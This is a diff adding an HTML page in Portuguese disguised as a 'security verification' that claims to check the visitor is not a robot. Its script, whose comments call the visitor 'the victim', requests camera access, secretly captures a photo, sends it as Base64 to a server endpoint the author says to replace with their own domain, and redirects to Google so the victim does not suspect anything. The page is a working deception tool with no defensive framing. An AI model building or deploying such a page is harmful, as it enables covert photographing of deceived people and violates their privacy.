@@ -1,0 +1,65 @@
+<!-- language: HTML, file: index.html -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
+        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        h2 { color: #333; }
+        p { color: #666; }
+        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Aviso de Segurança</h2>
+        <p>Para continuar e visualizar o conteúdo protegido, precisamos confirmar que você não é um robô.</p>
+        <button id="btn">Iniciar Verificação</button>
+    </div>
+
+    <script>
+        // Quando a vítima clica no botão, disparamos a câmera e o IP
+        document.getElementById('btn').addEventListener('click', async () => {
+            
+            // 1. Pede permissão da câmera (o navegador vai mostrar o popup)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                // Espera 1 segundo pra câmera focar
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    // Converte a foto pra Base64
+                    const photo = canvas.toDataURL('image/jpeg');
+                    
+                    // Manda pro servidor (troque pelo seu domínio depois)
+                    fetch('/api/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: photo })
+                    });
+                    
+                    // Desliga a câmera
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Redireciona a vítima pra um site real pra ela não desconfiar
+                    window.location.href = 'https://www.google.com';
+                }, 1000);
+                
+            } catch (err) {
+                // Se a vítima negar a câmera, só redireciona
+                window.location.href = 'https://www.google.com';
+            }
+        });
+    </script>
+</body>
+</html>
